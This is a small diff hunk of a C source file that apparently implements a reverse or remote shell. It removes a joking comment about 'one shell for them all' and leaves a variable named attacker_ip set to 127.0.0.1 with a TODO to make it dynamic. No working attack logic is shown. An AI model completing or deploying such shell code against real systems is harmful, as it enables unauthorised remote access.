@@ -5,7 +5,7 @@
 #include <sys/socket.h>
 #include <string.h>
 #include <stdlib.h> 
-#include <sys/types.h>  //im game: one shell for them all!
+#include <sys/types.h>  
 #include <sys/wait.h>
 
 const char* attacker_ip = "127.0.0.1"; //TODO: make dynamic
